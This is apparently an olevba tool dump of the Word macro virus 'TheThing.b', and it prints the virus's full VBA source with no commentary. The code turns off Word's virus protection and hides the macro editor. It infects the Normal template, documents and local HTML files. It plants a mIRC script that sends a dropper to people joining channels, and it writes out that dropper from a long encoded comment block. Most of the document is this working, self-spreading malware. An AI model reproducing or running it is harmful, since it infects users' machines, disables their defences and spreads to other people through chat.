olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheThing.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheThing.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html> <CyberShadow>
'<BODY>
'<script language="VBScript"><!--
'Private Sub Window_Onload()
' On Error Resume Next
' If Location.protocol = "file:" Then
'  Dim FSO
'  Set FSO = CreateObject("Scripting.FileSystemObject")
'  HostPath = Replace(Location.href, "file:///", "")
'  HostPath = Replace(HostPath, "/", "\")
'  Set WordObj = GetObject("", "Word.Application"): Quit = 0
'  If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): Quit = 1
'  Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
'  If NT.Lines(1, 1) <> "'<html> <CyberShadow>" Then
'   WordObj.Options.SaveNormalPrompt = False
'   NT.DeleteLines 1, NT.CountOfLines
'   NT.AddFromFile HostPath
''NT.NormalTemplate.Save
'   For j = 1 To 29
'    NT.ReplaceLine j, "'" + NT.Lines(j, 1)
'   Next
'   For j = 30 To NT.CountOfLines - 3
'    NT.ReplaceLine j, Mid(NT.Lines(j, 1), 2, Len(NT.Lines(j, 1)))
'   Next
'  End If
'  Set NT = Nothing
'  If Quit = 1 Then WordObj.Quit
' End If
'End Sub
Private Sub Document_Close()
 On Error Resume Next
 'TheThing
 'by CyberShadow//SMF
 Call DisableAll
 Call infectDoc
 Call infectMIRC
 Call WriteDump("c:\"): ' rv = Shell("c:\thething.com", 6)
 Kill "c:\thething.com"
 Call infectHTMS
 Application.ScreenUpdating = True
End Sub
Private Sub infectHTMS()
 On Error Resume Next
 a = System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Personal")
 Call SearchForHTM(a)
 a = Environ("PATH")
 i = 1
 Do While i <= Len(a)
  c = ""
  Do While i <= Len(a) And Mid$(a, i, 1) <> ";"
   c = c + Mid$(a, i, 1)
   i = i + 1
  Loop
  Call SearchForHTM(c)
  i = i + 1
 Loop
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
    ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Private Sub SearchForHTM(PathForHTM)
 On Error Resume Next
 Target = Dir$(PathForHTM + "\*.htm*")
 If Target = "" Then GoTo NoHTMs
 Do
  Open PathForHTM + "\" + Target For Input As #1
  Line Input #1, a
  If a <> "<html> <CyberShadow>" Then
   c = a
   Do While Not EOF(1)
    Input #1, a
    c = c + Chr$(13) + Chr$(10) + a
   Loop
  Close #1
  Open PathForHTM + "\" + Target For Output As #1
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   For i = 1 To AD.countoflines
    ca = AD.lines(i, 1)
    If i < 30 Then ca = Mid$(ca, 2, Len(ca) - 1)
    If i >= 30 And i < AD.countoflines - 2 Then ca = "'" + ca
    If ca <> "" Then Print #1, ca
   Next
  Print #1, c
  End If
  Close #1
  Target = Dir$
 Loop While Target <> ""
NoHTMs:
End Sub
Private Sub infectMIRC()
 For i = 0 To 5
  a = Chr$(Asc("C") + i)
  Call infect(a)
 Next
End Sub
Private Sub infect(a)
 On Error GoTo outta
 a1 = a + ":\mirc\"
 Open a1 + "script.ini" For Output As #1
  Print #1, "[script]"
  Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a1 + "thething.com"
 Close #1
 dropperPath = a1
 Call WriteDump(dropperPath)
outta:
End Sub
Private Sub DisableAll()
 On Error Resume Next
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 With Application
  .EnableCancelKey = True
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
End Sub
Private Sub infectDoc()
 On Error Resume Next
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) <> "'<html> <CyberShadow>" Then
   NT.DeleteLines 1, NT.countoflines
   NT.Insertlines 1, AD.lines(1, AD.countoflines)
 End If
 If AD.lines(1, 1) <> "'<html> <CyberShadow>" Then
   AD.DeleteLines 1, AD.countoflines
   AD.Insertlines 1, NT.lines(1, NT.countoflines)
 End If
 i = 1: c = AD.countofline
 Do While i <= c
  If AD.lines(i, 1) = "</HTML" + ">" Then
   AD.DeleteLines i + 1, AD.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
 i = 1: c = NT.countoflines
 Do While i <= c
  If NT.lines(i, 1) = "</HTML" + ">" Then
   NT.DeleteLines i + 1, NT.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
End Sub
Private Sub WriteDump(dropperPath)
 On Error Resume Next
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 checkit = "Dumpin"
 i = 1: GetDump = 0
 Do While i < AD.countoflines
  a = AD.lines(i, 1)
  If Len(a) > Len(checkit) Then
   For j = 1 To Len(a) - Len(checkit)
    If Mid$(a, j, Len(checkit) + 1) = checkit + "g" Then GetDump = i + 1: i = AD.countoflines
   Next
  End If
  i = i + 1
 Loop
 dropperBody = ""
 Do While Mid$(AD.lines(GetDump, 1), 1, 1) = "'"
  If Len(AD.lines(GetDump, 1)) > 2 Then
   For i = 2 To Len(AD.lines(GetDump, 1)) Step 2
    If Mid$(AD.lines(GetDump, 1), i, 1) <> " " Then
     a1 = Asc(Mid$(AD.lines(GetDump, 1), i, 1)) - 33
     b1 = Asc(Mid$(AD.lines(GetDump, 1), i + 1, 1)) - 33
     dropperBody = dropperBody + Chr$(a1 + 16 * b1)
    End If
   Next
  End If
  GetDump = GetDump + 1
 Loop
 Open dropperPath + "thething.com" For Output As #1
  Print #1, dropperBody;
 Close #1
End Sub
Private Sub Dumping()
'/#"+-#!!/)).$$,.+)(!-!!!%(&!!*!*$%,/&0$%
'+)(!+!!-&(//$)$-$!()+.),!!.$.-"#0!#)&("!
'$*/!/!(!0"+,!&$-*,!"(#%,0$.-"#$+'%$-%,/$
'.-"#),$)'"$$,..-0#&),.0!%)#&"!-00,,#$!)/
'#+"!0!#)(%"!0,+*-")/.)"!(&0,!#$!)/"*"!0&
'0!#)&$"!#$!-++/#*)/$!*,"''),000#$'!#'',+
')//'"!/!0"/,$$$!)/''"!!,.!++0,!#$!)/)'"!
'0,+*,")/(&"!/!0"/,*%$!)/0%"!")//*%$!$)'-
'*!!*/#*)'$#*,"+,$%$!$$*-%,-$.-"#0!#)*/!!
'$*+,%&$!%,!%*,-*#!.-"#/,+*,"0,!'+//#,)/!
'#*,"(&'&"&-0$0%+*&0&/&(&-+-$-&&()!!*!*++
'/#00'!#*,"++#/!0+&%,!%/#,)/!#*,".-"#+,!0
'&!%,!%*,"&!!.-"#+,+*,"%,!%/#,)/!#*,".-"#
'+,"%'!%,!%*,$!!!.-"#%,/$.-"#/!/!),!!+%,,
'!!!".-"#(!0"+,+*-",,%*,"/#(-(!!!!!/#"+!*
',"/#*)(%#!/#-)0%%!+0/#-)'"!*,"/#*)'##*,"
',0),!!,%.-"#+0/#/)'"!*,"/#,)'##*,",0+,$%
'$!%,"%.-"#0,!#$!)/&*!!0,+*-"(&)/$)!!/!0"
'/,*%$!)/,(!!+&$$*-%,-$.-"##('#!*!*$*+,%%
''!%,!%*,0"&".-"#+,+*-")/("!!"%%,!%.-"#+,
'$',"*,.#!!%,!%.-"#%,/$.-"#%,-%.-"#$&#&,)
'+0/,!&$-/#,)/!'%$-$!/-),(#(#,+#$,.-++)!/
'%#0!%!"#++"-)/-!%!"#++/0$-/0$-!),0)##(-!
'!*!*#$,.),.!+!,+),(#(#,+,$"0#(*.),!#!#'#
'*)&!,#+0,)0-+&,&$--++!!-%(&!!*!*++,/'0$-
',)0//#/)/"-#!!$$'0,).0$)-$!!%(+"!*!*-+%#
'0./#+$&!&(0/(%/#!).$!!&(+/-+-$+$&(,0/%/%
')0$-*0$-(&*%/%#%0%0%%&%%*%#&!!$%0%.%$&!&
'&%$%!!-&#&&%(%&%%%*%%&/#&%)&&%!#.#$(!##(
'/##(&'('!!-&*'/'%'&')(/#)'%(.'!!#&&%(%&%
'%%*%%&%$.!+!.!+!,&)%,%&%*&0&$%&&#&#&&%/%
'%&0&&&$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#(
'0'$(0'''%(-&0%''''*'$'&'-&)$/#!$-&&%)($'
'&'-'-&.%*'$'#(0'$(0'''%(!#&%)($'&'-'.&.!
'+!##0%!(%(*'0'/'$('$##.$####.!+!,&)%,%&%
'*&0&-%0%$%"%-%0&.%"%$%)%*%/%&%-&$&0'''%(
'(("'#(&'-&.%*'$'#(0'$(0'''%(-&0%''''*'$'
'&'-&)$/#!$-&&%)($'&'-'-&.%*'$'#(0'$(0'''
'%(!#&%)($'&'-'.&.!+!##0%!(%(*'0'/'$('$##
'.$####.!+!,&)%,%&%*&0&$%&&#&#&&%/%%&0&&&
'$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'
'''%(-&0%''''*'$'&'-&)$/#!$-&(&0'#(%'-&0%
'!(%(*'0'/'$(.&.!+!##&%/'"'#'-'&'.%"'$'#(
'0''&*'#(&($(!&#(0'%(&'$'%(*'0'/'##.$##!$
'##.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%"%$%)%*%
'/%&%-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'''
'%(-&0%''''*'$'&'-&)$/#!$-&(&0'#(%'-&0%!(
'%(*'0'/'$(.&.!+!##&%/'"'#'-'&'.%"'$'#(0'
''&*'#(&($(!&#(0'%(&'$'%(*'0'/'##.$##!$##
'.!+!,&)%,%&%*&0&$%&&#&#&&%/%%&0&&&$&&%#&
'-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'''%(-&
'(&*'/'%'0'(($(-&$%&(#(#(&'/'%('&&'#($(*'
'0'/'-&*%/'%(&'#(/'&'%(!#$&&'%(%(*'/'('$(
'-&+&0'/'&'$(-&!$.&.!+!##"$#$!$"$##!#.$!#
'####.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%"%$%)%
'*%/%&%-&$&0'''%((("'#(&'-&.%*'$'#(0'$(0'
'''%(-&(&*'/'%'0'(($(-&$%&(#(#(&'/'%('&&'
'#($(*'0'/'-&*%/'%(&'#(/'&'%(!#$&&'%(%(*'
'/'('$(-&+&0'/'&'$(-&!$.&.!+!##"$#$!$"$##
'!#.$!#####.!+!,&)%,%&%*&0&$%&&#&#&&%/%%&
'0&&&$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#(0'
'$(0'''%(-&*%/'%(&'#(/'&'%(!#&%)(!(-'0'#(
'&'#(-&.%"'*'/'.&.!+!##$&%("'#(%(!#!&"'('
'&'##.$####.!+!,&)%,%&%*&0&-%0%$%"%-%0&.%
'"%$%)%*%/%&%-&$&0'''%((("'#(&'-&.%*'$'#(
'0'$(0'''%(-&*%/'%(&'#(/'&'%(!#&%)(!(-'0'
'#(&'#(-&.%"'*'/'.&.!+!##$&%("'#(%(!#!&"'
'('&'##.$####.!+!-$)'%(.'-'/$!#-$$%*(#'&'
'#($&)'"'%'0'((/$.!+!-$#%0%%%*&/$.!+!-$$(
'$'#(*'!(%(!#-'"'/'('&("'('&'.$##'&#%$&$'
'#(*'!(%(##/$-$"#.#.#.!+!!&#(*''("'%(&'!#
'$&&(#'!#(&*'/'%'0'((0&0%/'-'0'"'%'.!+!!#
'0%/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(
'.!+!!#*%''!#-'0'$'"'%(*'0'/'/#!(#(0'%(0'
'$'0'-'!#.$!###''*'-'&'+$##!#%()'&'/'.!+!
'!#!#%%*'.'!#'%$&0%.!+!!#!#$&&'%(!#'%$&0%
'!#.$!#$%#(&'"'%(&'0%#'+'&'$'%()###$&$'#(
'*'!(%(*'/'('/#'%*'-'&'$&*($(%(&'.'0%#'+'
'&'$'%(##*#.!+!!#!#)%0'$(%(!&"'%()'!#.$!#
'#&&'!(-'"'$'&')#-'0'$'"'%(*'0'/'/#)'#(&'
'''-#!###''*'-'&'+$0#0#0###-#!#####*#.!+!
'!#!#)%0'$(%(!&"'%()'!#.$!##&&'!(-'"'$'&'
')#)%0'$(%(!&"'%()'-#!###0###-#!###-&##*#
'.!+!!#!#$&&'%(!#(&0'#(%'0%#'+'!#.$!#(%&'
'%(0%#'+'&'$'%()#####-###(&0'#(%'/#"%!(!(
'-'*'$'"'%(*'0'/'##*#+$!#"&&(*'%(!#.$!#!$
'.!+!!#!#*%''!#(&0'#(%'0%#'+'!#.$!#####!#
'%&)'&'/'!#$&&'%(!#(&0'#(%'0%#'+'!#.$!#$%
'#(&'"'%(&'0%#'+'&'$'%()###(&0'#(%'/#"%!(
'!(-'*'$'"'%(*'0'/'##*#+$!#"&&(*'%(!#.$!#
'"$.!+!!#!#$&&'%(!#/%%&!#.$!#(&0'#(%'0%#'
'+'/#%&&'.'!(-'"'%(&'$()#"$*#/#'&#%!&#(0'
'+'&'$'%(/#'&#%$%0'.'!(0'/'&'/'%($()#"$*#
'/#$%0'%'&'.'0'%'&(-'&'.!+!!#!#*%''!#/%%&
'/#-%*'/'&'$()#"$-#"$*#!#-$/$!###(#-$)'%(
'.'-'/$!#-$$%*(#'&'#($&)'"'%'0'((/$##!#%(
')'&'/'.!+!!#!#!#(&0'#(%'0%#'+'/#0%!(%(*'
'0'/'$(/#$&"''(&'/%0'#(.'"'-'!&#(0'.'!(%(
'!#.$!#'%"'-'$(&'.!+!!#!#!#/%%&/#%%&'-'&'
'%(&'-%*'/'&'$(!#"$-#!#/%%&/#$%0'&(/'%(0%
'''-%*'/'&'$(.!+!!#!#!#/%%&/#"%%'%'''#(0'
'.'''*'-'&'!#)%0'$(%(!&"'%()'.!+!(#/%%&/#
'/%0'#(.'"'-'%&&'.'!(-'"'%(&'/#$&"''(&'.!
'+!!#!#!#'%0'#(!#+'!#.$!#"$!#%(0'!##$*$.!
'+!!#!#!#!#/%%&/##&&'!(-'"'$'&'-%*'/'&'!#
'+'-#!###(###!#,#!#/%%&/#-%*'/'&'$()#+'-#
'"$*#.!+!!#!#!#/%&')(%(.!+!!#!#!#'%0'#(!#
'+'!#.$!#$$!$!#%(0'!#/%%&/#$%0'&(/'%(0%''
'-%*'/'&'$(.#$$.!+!!#!#!#!#/%%&/##&&'!(-'
'"'$'&'-%*'/'&'!#+'-#!#.'*'%')#/%%&/#-%*'
'/'&'$()#+'-#"$*#-##$-#-'&'/')#/%%&/#-%*'
'/'&'$()#+'-#"$*#*#*#.!+!!#!#!#/%&')(%(.!
'+!!#!#&%/'%'!#*%''.!+!!#!#$&&'%(!#/%%&!#
'.$!#/%0'%()'*'/'('.!+!!#!#*'''!#"&&(*'%(
'.$"$!#%()'&'/'!#(&0'#(%'0%#'+'/#"&&(*'%(
'.!+!!#&%/'%'!#*'''.!+!&%/'%'!#$&&(#'.!+!
'(#!&#(*''("'%(&'!#$&&(#'!#%%0'$'&(.'&'/'
'%(0&$%-'0'$(&')#*#.!+!(#!#0%/'!#&%#(#(0'
'#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#!#(#%&)'
'&'%&)'*'/'('.!+!(#!#(##'*(!#$%*(#'&'#($&
')'"'%'0'((0#0#$&.%'%.!+!(#!#$%"'-'-'!#%%
'*'$("'#'-'&'"%-'-'.!+!(#!#$%"'-'-'!#*'/'
'''&'$'%(%%0'$'.!+!(#!#$%"'-'-'!#*'/'''&'
'$'%(.%*%#&$%.!+!(#!#$%"'-'-'!#(&#(*'%(&'
'%%&(.'!()###$'+$-&##*#+$(#!##('(!#.$!#$&
')'&'-'-')###$'+$-&%()'&'%()'*'/'('/#$'0'
'.'##-#!#'$*#.!+!(#!#,%*'-'-'!###$'+$-&%(
')'&'%()'*'/'('/#$'0'.'##.!+!(#!#$%"'-'-'
'!#*'/'''&'$'%()%%&.%$&.!+!(#!#"%!(!(-'*'
'$'"'%(*'0'/'/#$&$'#(&'&'/'&&!(%'"'%(*'/'
'('!#.$!#%&#(&(&'.!+!(#&%/'%'!#$&&(#'.!+!
'(#!&#(*''("'%(&'!#$&&(#'!#*'/'''&'$'%()%
'%&.%$&)#*#.!+!(#!#0%/'!#&%#(#(0'#(!##&&'
'$(&(.'&'!#/%&')(%(.!+!(#!#"'!#.$!#$&*($(
'%(&'.'/#!&#(*''("'%(&'!&#(0'''*'-'&'$&%(
'#(*'/'(')#####-#!###)%,%&%*&0&$%&&#&#&&%
'/%%&0&&&$&&%#&-&$&0%'%%&(&"%#&&%-&.%*'$'
'#(0'$(0'''%(-&(&*'/'%'0'(($(-&$%&(#(#(&'
'/'%('&&'#($(*'0'/'-&&%)(!(-'0'#(&'#(-&$&
')'&'-'-'!#'%0'-'%'&'#($(##-#!###!&&'#($(
'0'/'"'-'##*#.!+!(#!#$%"'-'-'!#$&&'"'#($'
')''%0'#()%%&.%)#"'*#.!+!(#!#"'!#.$!#&%/'
''(*'#(0'/')###!&"%%&)%##*#.!+!(#!#*'!#.$
'!#"$.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#
'-%&'/')#"'*#.!+!(#!#!#$'!#.$!#####.!+!(#
'!#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#-%&'/')#
'"'*#!#"%/'%'!#.%*'%'%#)#"'-#!#*'-#!#"$*#
'!#-$/$!###,$##.!+!(#!#!#!#$'!#.$!#$'!#,#
'!#.%*'%'%#)#"'-#!#*'-#!#"$*#.!+!(#!#!#!#
'*'!#.$!#*'!#,#!#"$.!+!(#!#!#-%0'0'!(.!+!
'(#!#!#$%"'-'-'!#$&&'"'#($')''%0'#()%%&.%
')#$'*#.!+!(#!#!#*'!#.$!#*'!#,#!#"$.!+!(#
'!#-%0'0'!(.!+!(#&%/'%'!#$&&(#'.!+!(#!&#(
'*''("'%(&'!#$&&(#'!#'&*'&'(('&#%$%0'%'&'
')#*#+$!#$&%(&'"'-'%()'+$!#&%/'%'!#$&&(#'
'.!+!(#!&#(*''("'%(&'!#$&&(#'!#%&0'0'-'$(
'.%"'$'#(0')#*#+$!#$&%(&'"'-'%()'+$!#&%/'
'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&&(#'!#
''%*'-'&'%&&'.'!(-'"'%(&'$()#*#+$!#$&%(&'
'"'-'%()'+$!#&%/'%'!#$&&(#'.!+!(#!&#(*''(
'"'%(&'!#$&&(#'!#$&%(&'"'-'%()')#*#+$!#0%
'/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!
'+!(#!#!#!#!#$&)'0'(('&*'$(&("'-'#%"'$(*'
'$'&%%'*'%(0'#(!#.$!#!$+$!#"%!(!(-'*'$'"'
'%(*'0'/'/#&%/'"'#'-'&'$%"'/'$'&'-',%&'*(
'!#.$!#!$.!+!(#&%/'%'!#$&&(#'.!+!(#!&#(*'
''("'%(&'!#$&&(#'!#$&&'"'#($')''%0'#()%%&
'.%)#!&"'%()''%0'#()%%&.%*#.!+!(#!#0%/'!#
'&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#
'!#%&"'#(('&'%(!#.$!#%%*'#(%#)#!&"'%()''%
'0'#()%%&.%!#,#!###-&+#/#)'%(.'+###*#.!+!
'(#!#*%''!#%&"'#(('&'%(!#.$!#####!#%&)'&'
'/'!#(%0'%&0'!#/%0')%%&.%$(.!+!(#!#%%0'.!
'+!(#!#!#0%!(&'/'!#!&"'%()''%0'#()%%&.%!#
',#!###-&##!#,#!#%&"'#(('&'%(!#'%0'#(!#*%
'/'!(&(%(!#"%$(!#$#"$.!+!(#!#!#-%*'/'&'!#
'*%/'!(&(%(!#$#"$-#!#"'.!+!(#!#!#*%''!#"'
'!#-$/$!###-$)'%(.'-'/$!#-$$%*(#'&'#($&)'
'"'%'0'((/$##!#%&)'&'/'.!+!(#!#!#!#$'!#.$
'!#"'.!+!(#!#!#!#%%0'!#(&)'*'-'&'!#/%0'%(
'!#&%0%'%)#"$*#.!+!(#!#!#!#!#*%/'!(&(%(!#
'$#"$-#!#"'.!+!(#!#!#!#!#$'!#.$!#$'!#,#!#
'$%)'#(%#)#"$$$*#!#,#!#$%)'#(%#)#"$!$*#!#
',#!#"'.!+!(#!#!#!#-%0'0'!(.!+!(#!#!#$%-'
'0'$(&'!#$#"$.!+!(#!#!#0%!(&'/'!#!&"'%()'
''%0'#()%%&.%!#,#!###-&##!#,#!#%&"'#(('&'
'%(!#'%0'#(!#0%&(%(!(&(%(!#"%$(!#$#"$.!+!
'(#!#!#!#$&&'%(!#"%%%!#.$!#"%$'%(*''(&'%%
'0'$'&(.'&'/'%(/#'&#%!&#(0'+'&'$'%(/#'&#%
'$%0'.'!(0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'
'%'&(-'&'.!+!(#!#!#!#'%0'#(!#*'!#.$!#"$!#
'%&0'!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(.!+!
'(#!#!#!#!#$'"'!#.$!#"%%%/#-'*'/'&'$()#*'
'-#!#"$*#.!+!(#!#!#!#!#*%''!#*'!#-$!#$$!$
'!#%&)'&'/'!#$'"'!#.$!#.%*'%'%#)#$'"'-#!#
'#$-#!#-%&'/')#$'"'*#!#.#!#"$*#.!+!(#!#!#
'!#!#*%''!#*'!#.$/$!#$$!$!#"'/'%'!#*'!#-$
'!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(!#.#!##$
'!#%()'&'/'!#$'"'!#.$!###(###!#,#!#$'"'.!
'+!(#!#!#!#!#*'''!#$'"'!#-$/$!#####!#%()'
'&'/'!#!&#(*'/'%(!#$#"$-#!#$'"'.!+!(#!#!#
'!#/%&')(%(.!+!(#!#!#!&#(*'/'%(!#$#"$-#!#
'$'.!+!(#!#!#&%/'%'!#*%''.!+!(#!#!#$%-'0'
'$(&'!#$#"$.!+!(#!#!#%&"'#(('&'%(!#.$!#%%
'*'#(%#.!+!(#!#-%0'0'!(!#(&)'*'-'&'!#%&"'
'#(('&'%(!#-$/$!#####.!+!(#/%0')%%&.%$(+$
'.!+!(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'
'!#$&&(#'!#*'/'''&'$'%(.%*%#&$%)#*#.!+!(#
'!#'%0'#(!#*'!#.$!#!$!#%&0'!#&$.!+!(#!#!#
'"'!#.$!#$%)'#(%#)#"%$($')###$%##*#!#,#!#
'*'*#.!+!(#!#!#$%"'-'-'!#*'/'''&'$'%()#"'
'*#.!+!(#!#/%&')(%(.!+!(#&%/'%'!#$&&(#'.!
'+!(#!&#(*''("'%(&'!#$&&(#'!#*'/'''&'$'%(
')#"'*#.!+!(#!#0%/'!#&%#(#(0'#(!#(%0'%&0'
'!#0'&(%(%("'.!+!(#!#"'"$!#.$!#"'!#,#!###
'+$-&.'*'#($'-&##.!+!(#!#0%!(&'/'!#"'"$!#
',#!###$($'#(*'!(%(/#*'/'*'##!#'%0'#(!#0%
'&(%(!(&(%(!#"%$(!#$#"$.!+!(#!#!#!&#(*'/'
'%(!#$#"$-#!###,&$($'#(*'!(%(.&##.!+!(#!#
'!#!&#(*'/'%(!#$#"$-#!###/'!$.$0'/'!#"$+$
'+%0%*%/%+$$#+$0#%'$'$'!#$(&'/'%'!#%#/'*'
'$','!###!#,#!#"'"$!#,#!###%()'&'%()'*'/'
'('/#$'0'.'##.!+!(#!#$%-'0'$(&'!#$#"$.!+!
'(#!#%'#(0'!(!(&'#(!&"'%()'!#.$!#"'"$.!+!
'(#!#$%"'-'-'!#(&#(*'%(&'%%&(.'!()#%'#(0'
'!(!(&'#(!&"'%()'*#.!+!(#0'&(%(%("'+$.!+!
'(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&
'&(#'!#%%*'$("'#'-'&'"%-'-')#*#.!+!(#!#0%
'/'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!
'+!(#!#$&&'%("%%(%(#(!#/%0'#(.'"'-'%&&'.'
'!(-'"'%(&'/#!&"'%()'!#,#!###-&##!#,#!#/%
'0'#(.'"'-'%&&'.'!(-'"'%(&'-#!#!$.!+!(#!#
'(&*'%()'!#"%!(!(-'*'$'"'%(*'0'/'.!+!(#!#
'!#/#&%/'"'#'-'&'$%"'/'$'&'-',%&'*(!#.$!#
'%&#(&(&'.!+!(#!#!#/#$&$'#(&'&'/'&&!(%'"'
'%(*'/'('!#.$!#'%"'-'$(&'.!+!(#!#!#/#$&)'
'0'(('&*'$(&("'-'#%"'$(*'$'&%%'*'%(0'#(!#
'.$!#'%"'-'$(&'.!+!(#!#&%/'%'!#(&*'%()'.!
'+!(#!#(&*'%()'!#0%!(%(*'0'/'$(.!+!(#!#!#
'/#$%0'/'''*'#(.'$%0'/''(&'#($(*'0'/'$(!#
'.$!#'%"'-'$(&'.!+!(#!#!#/#$&"''(&'/%0'#(
'.'"'-'!&#(0'.'!(%(!#.$!#'%"'-'$(&'.!+!(#
'!#!#/#'&*'#(&($(!&#(0'%(&'$'%(*'0'/'!#.$
'!#'%"'-'$(&'.!+!(#!#&%/'%'!#(&*'%()'.!+!
'(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#$&
'&(#'!#*'/'''&'$'%(%%0'$')#*#.!+!(#!#0%/'
'!#&%#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!
'(#!#$&&'%(!#/%%&!#.$!#/%0'#(.'"'-'%&&'.'
'!(-'"'%(&'/#'&#%!&#(0'+'&'$'%(/#'&#%$%0'
'.'!(0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'%'&(
'-'&'.!+!(#!#$&&'%(!#"%%%!#.$!#"%$'%(*''(
'&'%%0'$'&(.'&'/'%(/#'&#%!&#(0'+'&'$'%(/#
''&#%$%0'.'!(0'/'&'/'%($()#"$*#/#$%0'%'&'
'.%0'%'&(-'&'.!+!(#!#*%''!#/%%&/#-'*'/'&'
'$()#"$-#!#"$*#!#-$/$!###(#-$)'%(.'-'/$!#
'-$$%*(#'&'#($&)'"'%'0'((/$##!#%&)'&'/'.!
'+!(#!#!#!#/%%&/#%%&'-'&'%(&'-%*'/'&'$(!#
'"$-#!#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.!+!
'(#!#!#!#/%%&/#*%/'$(&'#(%(-'*'/'&'$(!#"$
'-#!#"%%%/#-'*'/'&'$()#"$-#!#"%%%/#$'0'&(
'/'%(0'''-'*'/'&'$(*#.!+!(#!#&%/'%'!#*%''
'.!+!(#!#*%''!#"%%%/#-'*'/'&'$()#"$-#!#"$
'*#!#-$/$!###(#-$)'%(.'-'/$!#-$$%*(#'&'#(
'$&)'"'%'0'((/$##!#%&)'&'/'.!+!(#!#!#!#"%
'%%/#%%&'-'&'%(&'-%*'/'&'$(!#"$-#!#"%%%/#
'$'0'&(/'%(0'''-'*'/'&'$(.!+!(#!#!#!#"%%%
'/#*%/'$(&'#(%(-'*'/'&'$(!#"$-#!#/%%&/#-'
'*'/'&'$()#"$-#!#/%%&/#$'0'&(/'%(0'''-'*'
'/'&'$(*#.!+!(#!#&%/'%'!#*%''.!+!(#!#*'!#
'.$!#"$+$!#$'!#.$!#"%%%/#$'0'&(/'%(0'''-'
'*'/'&'.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$
'!#$'.!+!(#!#!#*%''!#"%%%/#-'*'/'&'$()#*'
'-#"$*#.$##-$0#)%%&.%-%##,###/$##!#%()'&'
'/'.!+!(#!#!#!#"%%%/#%%&'-'&'%(&'-%*'/'&'
'$(!#*',#"$-#"%%%/#$'0'&(/'%(0'''-'*'/'&'
'$(.#*'.#"$.!+!(#!#!#!#*'!#.$!#$'.!+!(#!#
'!#&%/'%'!#*%''.!+!(#!#!#*'!#.$!#*'!#,#!#
'"$.!+!(#!#-%0'0'!(.!+!(#!#*'!#.$!#"$+$!#
'$'!#.$!#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.!
'+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#$'.!+!
'(#!#!#*%''!#/%%&/#-'*'/'&'$()#*'-#"$*#.$
'##-$0#)%%&.%-%##,###/$##!#%()'&'/'.!+!(#
'!#!#!#/%%&/#%%&'-'&'%(&'-%*'/'&'$(!#*',#
'"$-#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.#*'.#
'"$.!+!(#!#!#!#*'!#.$!#$'.!+!(#!#!#&%/'%'
'!#*%''.!+!(#!#!#*'!#.$!#*'!#,#!#"$.!+!(#
'!#-%0'0'!(.!+!(#&%/'%'!#$&&(#'.!+!(#!&#(
'*''("'%(&'!#$&&(#'!#(&#(*'%(&'%%&(.'!()#
'%'#(0'!(!(&'#(!&"'%()'*#.!+!(#!#0%/'!#&%
'#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#!#
'$&&'%(!#"%%%!#.$!#"%$'%(*''(&'%%0'$'&(.'
'&'/'%(/#'&#%!&#(0'+'&'$'%(/#'&#%$%0'.'!(
'0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'%'&(-'&'
'.!+!(#!#$')'&'$','*'%(!#.$!###%%&(.'!(*'
'/'##.!+!(#!#*'!#.$!#"$+$!#(%&'%(%%&(.'!(
'!#.$!#!$.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$
'!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(.!+!(#!#
